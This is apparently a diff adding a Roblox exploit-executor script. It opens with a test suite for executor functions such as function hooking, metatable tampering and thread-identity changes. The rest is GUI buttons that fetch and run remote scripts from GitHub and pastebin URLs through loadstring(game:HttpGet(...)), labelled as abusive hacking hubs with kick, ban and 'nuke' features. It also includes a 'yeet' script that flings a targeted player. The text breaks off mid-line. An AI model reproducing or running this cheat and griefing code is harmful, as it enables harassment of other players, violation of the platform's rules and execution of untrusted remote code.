+					if type(t2[k]) ~= type(v) then
+						return false
+					end
+				elseif t2[k] ~= v then
+					return false
+				end
+			end
+	
+			for k, v in pairs(t2) do
+				if UNIQUE_TYPES[type(v)] then
+					if type(t2[k]) ~= type(v) then
+						return false
+					end
+				elseif t1[k] ~= v then
+					return false
+				end
+			end
+	
+			return true
+		end
+	
+		test("checkcaller", {}, function()
+			assert(checkcaller(), "Main scope should return true")
+		end)
+	
+		test("clonefunction", {}, function()
+			local function test()
+				return "success"
+			end
+			local copy = clonefunction(test)
+			assert(test() == copy(), "The clone should return the same value as the original")
+			assert(test ~= copy, "The clone should not be equal to the original")
+		end)
+	
+		test("getcallingscript", {})
+	
+		test("getscriptclosure", {"getscriptfunction"}, function()
+			local module = game:GetService("CoreGui").RobloxGui.Modules.Common.Constants
+			local constants = getrenv().require(module)
+			local generated = getscriptclosure(module)()
+			assert(constants ~= generated, "Generated module should not match the original")
+			assert(shallowEqual(constants, generated), "Generated constant table should be shallow equal to the original")
+		end)
+	
+		test("hookfunction", {"replaceclosure"}, function()
+			local function test()
+				return true
+			end
+			local ref = hookfunction(test, function()
+				return false
+			end)
+			assert(test() == false, "Function should return false")
+			assert(ref() == true, "Original function should return true")
+			assert(test ~= ref, "Original function should not be same as the reference")
+		end)
+	
+		test("iscclosure", {}, function()
+			assert(iscclosure(print) == true, "Function 'print' should be a C closure")
+			assert(iscclosure(function() end) == false, "Executor function should not be a C closure")
+		end)
+	
+		test("islclosure", {}, function()
+			assert(islclosure(print) == false, "Function 'print' should not be a Lua closure")
+			assert(islclosure(function() end) == true, "Executor function should be a Lua closure")
+		end)
+	
+		test("isexecutorclosure", {"checkclosure", "isourclosure"}, function()
+			assert(isexecutorclosure(isexecutorclosure) == true, "Did not return true for an executor global")
+			assert(isexecutorclosure(newcclosure(function() end)) == true, "Did not return true for an executor C closure")
+			assert(isexecutorclosure(function() end) == true, "Did not return true for an executor Luau closure")
+			assert(isexecutorclosure(print) == false, "Did not return false for a Roblox global")
+		end)
+	
+		test("loadstring", {}, function()
+			local animate = game:GetService("Players").LocalPlayer.Character.Animate
+			local bytecode = getscriptbytecode(animate)
+			local func = loadstring(bytecode)
+			assert(type(func) ~= "function", "Luau bytecode should not be loadable!")
+			assert(assert(loadstring("return ... + 1"))(1) == 2, "Failed to do simple math")
+			assert(type(select(2, loadstring("f"))) == "string", "Loadstring did not return anything for a compiler error")
+		end)
+	
+		test("newcclosure", {}, function()
+			local function test()
+				return true
+			end
+			local testC = newcclosure(test)
+			assert(test() == testC(), "New C closure should return the same value as the original")
+			assert(test ~= testC, "New C closure should not be same as the original")
+			assert(iscclosure(testC), "New C closure should be a C closure")
+		end)
+	
+		-- Console
+	
+		test("rconsoleclear", {"consoleclear"})
+	
+		test("rconsolecreate", {"consolecreate"})
+	
+		test("rconsoledestroy", {"consoledestroy"})
+	
+		test("rconsoleinput", {"consoleinput"})
+	
+		test("rconsoleprint", {"consoleprint"})
+	
+		test("rconsolesettitle", {"rconsolename", "consolesettitle"})
+	
+		-- Crypt
+	
+		test("crypt.base64encode", {"crypt.base64.encode", "crypt.base64_encode", "base64.encode", "base64_encode"}, function()
+			assert(crypt.base64encode("test") == "dGVzdA==", "Base64 encoding failed")
+		end)
+	
+		test("crypt.base64decode", {"crypt.base64.decode", "crypt.base64_decode", "base64.decode", "base64_decode"}, function()
+			assert(crypt.base64decode("dGVzdA==") == "test", "Base64 decoding failed")
+		end)
+	
+		test("crypt.encrypt", {}, function()
+			local key = crypt.generatekey()
+			local encrypted, iv = crypt.encrypt("test", key, nil, "CBC")
+			assert(iv, "crypt.encrypt should return an IV")
+			local decrypted = crypt.decrypt(encrypted, key, iv, "CBC")
+			assert(decrypted == "test", "Failed to decrypt raw string from encrypted data")
+		end)
+	
+		test("crypt.decrypt", {}, function()
+			local key, iv = crypt.generatekey(), crypt.generatekey()
+			local encrypted = crypt.encrypt("test", key, iv, "CBC")
+			local decrypted = crypt.decrypt(encrypted, key, iv, "CBC")
+			assert(decrypted == "test", "Failed to decrypt raw string from encrypted data")
+		end)
+	
+		test("crypt.generatebytes", {}, function()
+			local size = math.random(10, 100)
+			local bytes = crypt.generatebytes(size)
+			assert(#crypt.base64decode(bytes) == size, "The decoded result should be " .. size .. " bytes long (got " .. #crypt.base64decode(bytes) .. " decoded, " .. #bytes .. " raw)")
+		end)
+	
+		test("crypt.generatekey", {}, function()
+			local key = crypt.generatekey()
+			assert(#crypt.base64decode(key) == 32, "Generated key should be 32 bytes long when decoded")
+		end)
+	
+		test("crypt.hash", {}, function()
+			local algorithms = {'sha1', 'sha384', 'sha512', 'md5', 'sha256', 'sha3-224', 'sha3-256', 'sha3-512'}
+			for _, algorithm in ipairs(algorithms) do
+				local hash = crypt.hash("test", algorithm)
+				assert(hash, "crypt.hash on algorithm '" .. algorithm .. "' should return a hash")
+			end
+		end)
+	
+		--- Debug
+	
+		test("debug.getconstant", {}, function()
+			local function test()
+				print("Hello, world!")
+			end
+			assert(debug.getconstant(test, 1) == "print", "First constant must be print")
+			assert(debug.getconstant(test, 2) == nil, "Second constant must be nil")
+			assert(debug.getconstant(test, 3) == "Hello, world!", "Third constant must be 'Hello, world!'")
+		end)
+	
+		test("debug.getconstants", {}, function()
+			local function test()
+				local num = 5000 .. 50000
+				print("Hello, world!", num, warn)
+			end
+			local constants = debug.getconstants(test)
+			assert(constants[1] == 50000, "First constant must be 50000")
+			assert(constants[2] == "print", "Second constant must be print")
+			assert(constants[3] == nil, "Third constant must be nil")
+			assert(constants[4] == "Hello, world!", "Fourth constant must be 'Hello, world!'")
+			assert(constants[5] == "warn", "Fifth constant must be warn")
+		end)
+	
+		test("debug.getinfo", {}, function()
+			local types = {
+				source = "string",
+				short_src = "string",
+				func = "function",
+				what = "string",
+				currentline = "number",
+				name = "string",
+				nups = "number",
+				numparams = "number",
+				is_vararg = "number",
+			}
+			local function test(...)
+				print(...)
+			end
+			local info = debug.getinfo(test)
+			for k, v in pairs(types) do
+				assert(info[k] ~= nil, "Did not return a table with a '" .. k .. "' field")
+				assert(type(info[k]) == v, "Did not return a table with " .. k .. " as a " .. v .. " (got " .. type(info[k]) .. ")")
+			end
+		end)
+	
+		test("debug.getproto", {}, function()
+			local function test()
+				local function proto()
+					return true
+				end
+			end
+			local proto = debug.getproto(test, 1, true)[1]
+			local realproto = debug.getproto(test, 1)
+			assert(proto, "Failed to get the inner function")
+			assert(proto() == true, "The inner function did not return anything")
+			if not realproto() then
+				return "Proto return values are disabled on this executor"
+			end
+		end)
+	
+		test("debug.getprotos", {}, function()
+			local function test()
+				local function _1()
+					return true
+				end
+				local function _2()
+					return true
+				end
+				local function _3()
+					return true
+				end
+			end
+			for i in ipairs(debug.getprotos(test)) do
+				local proto = debug.getproto(test, i, true)[1]
+				local realproto = debug.getproto(test, i)
+				assert(proto(), "Failed to get inner function " .. i)
+				if not realproto() then
+					return "Proto return values are disabled on this executor"
+				end
+			end
+		end)
+	
+		test("debug.getstack", {}, function()
+			local _ = "a" .. "b"
+			assert(debug.getstack(1, 1) == "ab", "The first item in the stack should be 'ab'")
+			assert(debug.getstack(1)[1] == "ab", "The first item in the stack table should be 'ab'")
+		end)
+	
+		test("debug.getupvalue", {}, function()
+			local upvalue = function() end
+			local function test()
+				print(upvalue)
+			end
+			assert(debug.getupvalue(test, 1) == upvalue, "Unexpected value returned from debug.getupvalue")
+		end)
+	
+		test("debug.getupvalues", {}, function()
+			local upvalue = function() end
+			local function test()
+				print(upvalue)
+			end
+			local upvalues = debug.getupvalues(test)
+			assert(upvalues[1] == upvalue, "Unexpected value returned from debug.getupvalues")
+		end)
+	
+		test("debug.setconstant", {}, function()
+			local function test()
+				return "fail"
+			end
+			debug.setconstant(test, 1, "success")
+			assert(test() == "success", "debug.setconstant did not set the first constant")
+		end)
+	
+		test("debug.setstack", {}, function()
+			local function test()
+				return "fail", debug.setstack(1, 1, "success")
+			end
+			assert(test() == "success", "debug.setstack did not set the first stack item")
+		end)
+	
+		test("debug.setupvalue", {}, function()
+			local function upvalue()
+				return "fail"
+			end
+			local function test()
+				return upvalue()
+			end
+			debug.setupvalue(test, 1, function()
+				return "success"
+			end)
+			assert(test() == "success", "debug.setupvalue did not set the first upvalue")
+		end)
+	
+		-- Filesystem
+	
+		if isfolder and makefolder and delfolder then
+			if isfolder(".tests") then
+				delfolder(".tests")
+			end
+			makefolder(".tests")
+		end
+	
+		test("readfile", {}, function()
+			writefile(".tests/readfile.txt", "success")
+			assert(readfile(".tests/readfile.txt") == "success", "Did not return the contents of the file")
+		end)
+	
+		test("listfiles", {}, function()
+			makefolder(".tests/listfiles")
+			writefile(".tests/listfiles/test_1.txt", "success")
+			writefile(".tests/listfiles/test_2.txt", "success")
+			local files = listfiles(".tests/listfiles")
+			assert(#files == 2, "Did not return the correct number of files")
+			assert(isfile(files[1]), "Did not return a file path")
+			assert(readfile(files[1]) == "success", "Did not return the correct files")
+			makefolder(".tests/listfiles_2")
+			makefolder(".tests/listfiles_2/test_1")
+			makefolder(".tests/listfiles_2/test_2")
+			local folders = listfiles(".tests/listfiles_2")
+			assert(#folders == 2, "Did not return the correct number of folders")
+			assert(isfolder(folders[1]), "Did not return a folder path")
+		end)
+	
+		test("writefile", {}, function()
+			writefile(".tests/writefile.txt", "success")
+			assert(readfile(".tests/writefile.txt") == "success", "Did not write the file")
+			local requiresFileExt = pcall(function()
+				writefile(".tests/writefile", "success")
+				assert(isfile(".tests/writefile.txt"))
+			end)
+			if not requiresFileExt then
+				return "This executor requires a file extension in writefile"
+			end
+		end)
+	
+		test("makefolder", {}, function()
+			makefolder(".tests/makefolder")
+			assert(isfolder(".tests/makefolder"), "Did not create the folder")
+		end)
+	
+		test("appendfile", {}, function()
+			writefile(".tests/appendfile.txt", "su")
+			appendfile(".tests/appendfile.txt", "cce")
+			appendfile(".tests/appendfile.txt", "ss")
+			assert(readfile(".tests/appendfile.txt") == "success", "Did not append the file")
+		end)
+	
+		test("isfile", {}, function()
+			writefile(".tests/isfile.txt", "success")
+			assert(isfile(".tests/isfile.txt") == true, "Did not return true for a file")
+			assert(isfile(".tests") == false, "Did not return false for a folder")
+			assert(isfile(".tests/doesnotexist.exe") == false, "Did not return false for a nonexistent path (got " .. tostring(isfile(".tests/doesnotexist.exe")) .. ")")
+		end)
+	
+		test("isfolder", {}, function()
+			assert(isfolder(".tests") == true, "Did not return false for a folder")
+			assert(isfolder(".tests/doesnotexist.exe") == false, "Did not return false for a nonexistent path (got " .. tostring(isfolder(".tests/doesnotexist.exe")) .. ")")
+		end)
+	
+		test("delfolder", {}, function()
+			makefolder(".tests/delfolder")
+			delfolder(".tests/delfolder")
+			assert(isfolder(".tests/delfolder") == false, "Failed to delete folder (isfolder = " .. tostring(isfolder(".tests/delfolder")) .. ")")
+		end)
+	
+		test("delfile", {}, function()
+			writefile(".tests/delfile.txt", "Hello, world!")
+			delfile(".tests/delfile.txt")
+			assert(isfile(".tests/delfile.txt") == false, "Failed to delete file (isfile = " .. tostring(isfile(".tests/delfile.txt")) .. ")")
+		end)
+	
+		test("loadfile", {}, function()
+			writefile(".tests/loadfile.txt", "return ... + 1")
+			assert(assert(loadfile(".tests/loadfile.txt"))(1) == 2, "Failed to load a file with arguments")
+			writefile(".tests/loadfile.txt", "f")
+			local callback, err = loadfile(".tests/loadfile.txt")
+			assert(err and not callback, "Did not return an error message for a compiler error")
+		end)
+	
+		test("dofile", {})
+	
+		-- Input
+	
+		test("isrbxactive", {"isgameactive"}, function()
+			assert(type(isrbxactive()) == "boolean", "Did not return a boolean value")
+		end)
+	
+		test("mouse1click", {})
+	
+		test("mouse1press", {})
+	
+		test("mouse1release", {})
+	
+		test("mouse2click", {})
+	
+		test("mouse2press", {})
+	
+		test("mouse2release", {})
+	
+		test("mousemoveabs", {})
+	
+		test("mousemoverel", {})
+	
+		test("mousescroll", {})
+	
+		-- Instances
+	
+		test("fireclickdetector", {}, function()
+			local detector = Instance.new("ClickDetector")
+			fireclickdetector(detector, 50, "MouseHoverEnter")
+		end)
+	
+		test("getcallbackvalue", {}, function()
+			local bindable = Instance.new("BindableFunction")
+			local function test()
+			end
+			bindable.OnInvoke = test
+			assert(getcallbackvalue(bindable, "OnInvoke") == test, "Did not return the correct value")
+		end)
+	
+		test("getconnections", {}, function()
+			local types = {
+				Enabled = "boolean",
+				ForeignState = "boolean",
+				LuaConnection = "boolean",
+				Function = "function",
+				Thread = "thread",
+				Fire = "function",
+				Defer = "function",
+				Disconnect = "function",
+				Disable = "function",
+				Enable = "function",
+			}
+			local bindable = Instance.new("BindableEvent")
+			bindable.Event:Connect(function() end)
+			local connection = getconnections(bindable.Event)[1]
+			for k, v in pairs(types) do
+				assert(connection[k] ~= nil, "Did not return a table with a '" .. k .. "' field")
+				assert(type(connection[k]) == v, "Did not return a table with " .. k .. " as a " .. v .. " (got " .. type(connection[k]) .. ")")
+			end
+		end)
+	
+		test("getcustomasset", {}, function()
+			writefile(".tests/getcustomasset.txt", "success")
+			local contentId = getcustomasset(".tests/getcustomasset.txt")
+			assert(type(contentId) == "string", "Did not return a string")
+			assert(#contentId > 0, "Returned an empty string")
+			assert(string.match(contentId, "rbxasset://") == "rbxasset://", "Did not return an rbxasset url")
+		end)
+	
+		test("gethiddenproperty", {}, function()
+			local fire = Instance.new("Fire")
+			local property, isHidden = gethiddenproperty(fire, "size_xml")
+			assert(property == 5, "Did not return the correct value")
+			assert(isHidden == true, "Did not return whether the property was hidden")
+		end)
+	
+		test("sethiddenproperty", {}, function()
+			local fire = Instance.new("Fire")
+			local hidden = sethiddenproperty(fire, "size_xml", 10)
+			assert(hidden, "Did not return true for the hidden property")
+			assert(gethiddenproperty(fire, "size_xml") == 10, "Did not set the hidden property")
+		end)
+	
+		test("gethui", {}, function()
+			assert(typeof(gethui()) == "Instance", "Did not return an Instance")
+		end)
+	
+		test("getinstances", {}, function()
+			assert(getinstances()[1]:IsA("Instance"), "The first value is not an Instance")
+		end)
+	
+		test("getnilinstances", {}, function()
+			assert(getnilinstances()[1]:IsA("Instance"), "The first value is not an Instance")
+			assert(getnilinstances()[1].Parent == nil, "The first value is not parented to nil")
+		end)
+	
+		test("isscriptable", {}, function()
+			local fire = Instance.new("Fire")
+			assert(isscriptable(fire, "size_xml") == false, "Did not return false for a non-scriptable property (size_xml)")
+			assert(isscriptable(fire, "Size") == true, "Did not return true for a scriptable property (Size)")
+		end)
+	
+		test("setscriptable", {}, function()
+			local fire = Instance.new("Fire")
+			local wasScriptable = setscriptable(fire, "size_xml", true)
+			assert(wasScriptable == false, "Did not return false for a non-scriptable property (size_xml)")
+			assert(isscriptable(fire, "size_xml") == true, "Did not set the scriptable property")
+			fire = Instance.new("Fire")
+			assert(isscriptable(fire, "size_xml") == false, "โ ๏ธโ ๏ธ setscriptable persists between unique instances โ ๏ธโ ๏ธ")
+		end)
+	
+		test("setrbxclipboard", {})
+	
+		-- Metatable
+	
+		test("getrawmetatable", {}, function()
+			local metatable = { __metatable = "Locked!" }
+			local object = setmetatable({}, metatable)
+			assert(getrawmetatable(object) == metatable, "Did not return the metatable")
+		end)
+	
+		test("hookmetamethod", {}, function()
+			local object = setmetatable({}, { __index = newcclosure(function() return false end), __metatable = "Locked!" })
+			local ref = hookmetamethod(object, "__index", function() return true end)
+			assert(object.test == true, "Failed to hook a metamethod and change the return value")
+			assert(ref() == false, "Did not return the original function")
+		end)
+	
+		test("getnamecallmethod", {}, function()
+			local method
+			local ref
+			ref = hookmetamethod(game, "__namecall", function(...)
+				if not method then
+					method = getnamecallmethod()
+				end
+				return ref(...)
+			end)
+			game:GetService("Lighting")
+			assert(method == "GetService", "Did not get the correct method (GetService)")
+		end)
+	
+		test("isreadonly", {}, function()
+			local object = {}
+			table.freeze(object)
+			assert(isreadonly(object), "Did not return true for a read-only table")
+		end)
+	
+		test("setrawmetatable", {}, function()
+			local object = setmetatable({}, { __index = function() return false end, __metatable = "Locked!" })
+			local objectReturned = setrawmetatable(object, { __index = function() return true end })
+			assert(object, "Did not return the original object")
+			assert(object.test == true, "Failed to change the metatable")
+			if objectReturned then
+				return objectReturned == object and "Returned the original object" or "Did not return the original object"
+			end
+		end)
+	
+		test("setreadonly", {}, function()
+			local object = { success = false }
+			table.freeze(object)
+			setreadonly(object, false)
+			object.success = true
+			assert(object.success, "Did not allow the table to be modified")
+		end)
+	
+		-- Miscellaneous
+	
+		test("identifyexecutor", {"getexecutorname"}, function()
+			local name, version = identifyexecutor()
+			assert(type(name) == "string", "Did not return a string for the name")
+			return type(version) == "string" and "Returns version as a string" or "Does not return version"
+		end)
+	
+		test("lz4compress", {}, function()
+			local raw = "Hello, world!"
+			local compressed = lz4compress(raw)
+			assert(type(compressed) == "string", "Compression did not return a string")
+			assert(lz4decompress(compressed, #raw) == raw, "Decompression did not return the original string")
+		end)
+	
+		test("lz4decompress", {}, function()
+			local raw = "Hello, world!"
+			local compressed = lz4compress(raw)
+			assert(type(compressed) == "string", "Compression did not return a string")
+			assert(lz4decompress(compressed, #raw) == raw, "Decompression did not return the original string")
+		end)
+	
+		test("messagebox", {})
+	
+		test("queue_on_teleport", {"queueonteleport"})
+	
+		test("request", {"http.request", "http_request"}, function()
+			local response = request({
+				Url = "https://httpbin.org/user-agent",
+				Method = "GET",
+			})
+			assert(type(response) == "table", "Response must be a table")
+			assert(response.StatusCode == 200, "Did not return a 200 status code")
+			local data = game:GetService("HttpService"):JSONDecode(response.Body)
+			assert(type(data) == "table" and type(data["user-agent"]) == "string", "Did not return a table with a user-agent key")
+			return "User-Agent: " .. data["user-agent"]
+		end)
+	
+		test("setclipboard", {"toclipboard"})
+	
+		test("setfpscap", {}, function()
+			local renderStepped = game:GetService("RunService").RenderStepped
+			local function step()
+				renderStepped:Wait()
+				local sum = 0
+				for _ = 1, 5 do
+					sum += 1 / renderStepped:Wait()
+				end
+				return math.round(sum / 5)
+			end
+			setfpscap(60)
+			local step60 = step()
+			setfpscap(0)
+			local step0 = step()
+			return step60 .. "fps @60 โ€ข " .. step0 .. "fps @0"
+		end)
+	
+		-- Scripts
+	
+		test("getgc", {}, function()
+			local gc = getgc()
+			assert(type(gc) == "table", "Did not return a table")
+			assert(#gc > 0, "Did not return a table with any values")
+		end)
+	
+		test("getgenv", {}, function()
+			getgenv().__TEST_GLOBAL = true
+			assert(__TEST_GLOBAL, "Failed to set a global variable")
+			getgenv().__TEST_GLOBAL = nil
+		end)
+	
+		test("getloadedmodules", {}, function()
+			local modules = getloadedmodules()
+			assert(type(modules) == "table", "Did not return a table")
+			assert(#modules > 0, "Did not return a table with any values")
+			assert(typeof(modules[1]) == "Instance", "First value is not an Instance")
+			assert(modules[1]:IsA("ModuleScript"), "First value is not a ModuleScript")
+		end)
+	
+		test("getrenv", {}, function()
+			assert(_G ~= getrenv()._G, "The variable _G in the executor is identical to _G in the game")
+		end)
+	
+		test("getrunningscripts", {}, function()
+			local scripts = getrunningscripts()
+			assert(type(scripts) == "table", "Did not return a table")
+			assert(#scripts > 0, "Did not return a table with any values")
+			assert(typeof(scripts[1]) == "Instance", "First value is not an Instance")
+			assert(scripts[1]:IsA("ModuleScript") or scripts[1]:IsA("LocalScript"), "First value is not a ModuleScript or LocalScript")
+		end)
+	
+		test("getscriptbytecode", {"dumpstring"}, function()
+			local animate = game:GetService("Players").LocalPlayer.Character.Animate
+			local bytecode = getscriptbytecode(animate)
+			assert(type(bytecode) == "string", "Did not return a string for Character.Animate (a " .. animate.ClassName .. ")")
+		end)
+	
+		test("getscripthash", {}, function()
+			local animate = game:GetService("Players").LocalPlayer.Character.Animate:Clone()
+			local hash = getscripthash(animate)
+			local source = animate.Source
+			animate.Source = "print('Hello, world!')"
+			task.defer(function()
+				animate.Source = source
+			end)
+			local newHash = getscripthash(animate)
+			assert(hash ~= newHash, "Did not return a different hash for a modified script")
+			assert(newHash == getscripthash(animate), "Did not return the same hash for a script with the same source")
+		end)
+	
+		test("getscripts", {}, function()
+			local scripts = getscripts()
+			assert(type(scripts) == "table", "Did not return a table")
+			assert(#scripts > 0, "Did not return a table with any values")
+			assert(typeof(scripts[1]) == "Instance", "First value is not an Instance")
+			assert(scripts[1]:IsA("ModuleScript") or scripts[1]:IsA("LocalScript"), "First value is not a ModuleScript or LocalScript")
+		end)
+	
+		test("getsenv", {}, function()
+			local animate = game:GetService("Players").LocalPlayer.Character.Animate
+			local env = getsenv(animate)
+			assert(type(env) == "table", "Did not return a table for Character.Animate (a " .. animate.ClassName .. ")")
+			assert(env.script == animate, "The script global is not identical to Character.Animate")
+		end)
+	
+		test("getthreadidentity", {"getidentity", "getthreadcontext"}, function()
+			assert(type(getthreadidentity()) == "number", "Did not return a number")
+		end)
+	
+		test("setthreadidentity", {"setidentity", "setthreadcontext"}, function()
+			setthreadidentity(3)
+			assert(getthreadidentity() == 3, "Did not set the thread identity")
+		end)
+	
+		-- Drawing
+	
+		test("Drawing", {})
+	
+		test("Drawing.new", {}, function()
+			local drawing = Drawing.new("Square")
+			drawing.Visible = false
+			local canDestroy = pcall(function()
+				drawing:Destroy()
+			end)
+			assert(canDestroy, "Drawing:Destroy() should not throw an error")
+		end)
+	
+		test("Drawing.Fonts", {}, function()
+			assert(Drawing.Fonts.UI == 0, "Did not return the correct id for UI")
+			assert(Drawing.Fonts.System == 1, "Did not return the correct id for System")
+			assert(Drawing.Fonts.Plex == 2, "Did not return the correct id for Plex")
+			assert(Drawing.Fonts.Monospace == 3, "Did not return the correct id for Monospace")
+		end)
+	
+		test("isrenderobj", {}, function()
+			local drawing = Drawing.new("Image")
+			drawing.Visible = true
+			assert(isrenderobj(drawing) == true, "Did not return true for an Image")
+			assert(isrenderobj(newproxy()) == false, "Did not return false for a blank table")
+		end)
+	
+		test("getrenderproperty", {}, function()
+			local drawing = Drawing.new("Image")
+			drawing.Visible = true
+			assert(type(getrenderproperty(drawing, "Visible")) == "boolean", "Did not return a boolean value for Image.Visible")
+			local success, result = pcall(function()
+				return getrenderproperty(drawing, "Color")
+			end)
+			if not success or not result then
+				return "Image.Color is not supported"
+			end
+		end)
+	
+		test("setrenderproperty", {}, function()
+			local drawing = Drawing.new("Square")
+			drawing.Visible = true
+			setrenderproperty(drawing, "Visible", false)
+			assert(drawing.Visible == false, "Did not set the value for Square.Visible")
+		end)
+	
+		test("cleardrawcache", {}, function()
+			cleardrawcache()
+		end)
+	
+		-- WebSocket
+	
+		test("WebSocket", {})
+	
+		test("WebSocket.connect", {}, function()
+			local types = {
+				Send = "function",
+				Close = "function",
+				OnMessage = {"table", "userdata"},
+				OnClose = {"table", "userdata"},
+			}
+			local ws = WebSocket.connect("ws://echo.websocket.events")
+			assert(type(ws) == "table" or type(ws) == "userdata", "Did not return a table or userdata")
+			for k, v in pairs(types) do
+				if type(v) == "table" then
+					assert(table.find(v, type(ws[k])), "Did not return a " .. table.concat(v, ", ") .. " for " .. k .. " (a " .. type(ws[k]) .. ")")
+				else
+					assert(type(ws[k]) == v, "Did not return a " .. v .. " for " .. k .. " (a " .. type(ws[k]) .. ")")
+				end
+			end
+			ws:Close()
+		end)
+	
+	end)
+	
+	
+end
+coroutine.wrap(QCKOV_fake_script)()
+local function NZMXPD_fake_script() -- redz.Script 
+	local script = Instance.new('Script', redz)
+
+	redz.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()
+	end)
+	
+end
+coroutine.wrap(NZMXPD_fake_script)()
+local function XZWYBL_fake_script() -- jul.Script 
+	local script = Instance.new('Script', jul)
+
+	jul.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Trev0rZ/LoaderM/main/ImperialHub-Working.lua"),true))()
+	end)
+	
+end
+coroutine.wrap(XZWYBL_fake_script)()
+local function KTFJHD_fake_script() -- yeet.Script 
+	local script = Instance.new('Script', yeet)
+
+	
+	yeet.MouseButton1Down:connect(function()
+		--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+		local lp = game:FindService("Players").LocalPlayer
+	
+		local function gplr(String)
+			local Found = {}
+			local strl = String:lower()
+			if strl == "all" then
+				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+					table.insert(Found,v)
+				end
+			elseif strl == "others" then
+				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+					if v.Name ~= lp.Name then
+						table.insert(Found,v)
+					end
+				end 
+			elseif strl == "me" then
+				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+					if v.Name == lp.Name then
+						table.insert(Found,v)
+					end
+				end 
+			else
+				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+					if v.Name:lower():sub(1, #String) == String:lower() then
+						table.insert(Found,v)
+					end
+				end 
+			end
+			return Found 
+		end
+	
+		local function notif(str,dur)
+			game:FindService("StarterGui"):SetCore("SendNotification", {
+				Title = "yeet gui",
+				Text = str,
+				Icon = "rbxassetid://2005276185",
+				Duration = dur or 3
+			})
+		end
+	
+		--// sds
+	
+		local h = Instance.new("ScreenGui")
+		local Main = Instance.new("ImageLabel")
+		local Top = Instance.new("Frame")
+		local Title = Instance.new("TextLabel")
+		local TextBox = Instance.new("TextBox")
+		local TextButton = Instance.new("TextButton")
+	
+		h.Name = "h"
+		h.Parent = game:GetService("CoreGui")
+		h.ResetOnSpawn = false
+	
+		Main.Name = "Main"
+		Main.Parent = h
+		Main.Active = true
+		Main.Draggable = true
+		Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		Main.BorderSizePixel = 0
+		Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
+		Main.Size = UDim2.new(0, 454, 0, 218)
+		Main.Image = "rbxassetid://2005276185"
+	
+		Top.Name = "Top"
+		Top.Parent = Main
+		Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
+		Top.BorderSizePixel = 0
+		Top.Size = UDim2.new(0, 454, 0, 44)
+	
+		Title.Name = "Title"
+		Title.Parent = Top
+		Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+		Title.BorderSizePixel = 0
+		Title.Position = UDim2.new(0, 0, 0.295454562, 0)
+		Title.Size = UDim2.new(0, 454, 0, 30)
+		Title.Font = Enum.Font.SourceSans
+		Title.Text = "FE Yeet Gui (trollface edition)"
+		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Title.TextScaled = true
+		Title.TextSize = 14.000
+		Title.TextWrapped = true
+	
+		TextBox.Parent = Main
+		TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+		TextBox.BorderSizePixel = 0
+		TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
+		TextBox.Size = UDim2.new(0, 388, 0, 62)
+		TextBox.Font = Enum.Font.SourceSans
+		TextBox.PlaceholderText = "Who do i destroy(can be shortened)"
+		TextBox.Text = ""
+		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+		TextBox.TextScaled = true
+		TextBox.TextSize = 14.000
+		TextBox.TextWrapped = true
+	
+		TextButton.Parent = Main
+		TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+		TextButton.BorderSizePixel = 0
+		TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
+		TextButton.Size = UDim2.new(0, 359, 0, 50)
+		TextButton.Font = Enum.Font.SourceSans
+		TextButton.Text = "Cheese em'"
+		TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		TextButton.TextScaled = true
+		TextButton.TextSize = 14.000
+		TextButton.TextWrapped = true
+	
+		TextButton.MouseButton1Click:Connect(function()
+			local Target = gplr(TextBox.Text)
+			if Target[1] then
+				Target = Target[1]
+	
+				local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+				Thrust.Force = Vector3.new(9999,9999,9999)
+				Thrust.Name = "YeetForce"
+				repeat
+					lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+					Thrust.Location = Target.Character.HumanoidRootPart.Position
+					game:FindService("RunService").Heartbeat:wait()
+				until not Target.Character:FindFirstChild("Head")
+			else
+				notif("Invalid player")
+			end
+		end)
+	
+		--//fsddfsdf
+		notif("Loaded successfully! Created by scuba#0001", 5)
+	end)
+	
+	
+	
+end
+coroutine.wrap(KTFJHD_fake_script)()
+local function SYIW_fake_script() -- C00LMAN.Script 
+	local script = Instance.new('Script', C00LMAN)
+
+	
+	C00LMAN.MouseButton1Down:connect(function()
+			local a=loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()local a=a.CreateLib("c00lman edit","Ocean")local b=a:NewTab("Credits/Info")local c=b:NewSection("Made By C00LMAN Scripts made by")local c=b:NewSection("Harked Options : PandaExploits#3098")local c=b:NewSection("Destructed_Hex's GUI Scripts : Luca and luq")local b=b:NewSection("quirkyCMD adm : ____")local b=a:NewTab("GUIS ABUSIVE")local b=b:NewSection("Scripts For Hacking")b:NewButton("Harked V2","Harked With Kick Kill Ban Blockhead BlockChar ETC",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()end)b:NewButton("Destruction_Hex's GUI","Harked But With more options like Shutodwn Nuke ETC",function()loadstring(game:HttpGet("https://pastebin.com/raw/S28p8fN9"))()end)b:NewButton("QuirkyCmd","The Best ADM Script",function()loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()end)b:NewButton("Bring GUI","a simple bring script",function()loadstring(game:HttpGet(('https://pastebin.com/raw/iThJgCAS'),true))()end)b:NewButton("Nameless Admin","Universal GOOD Admin 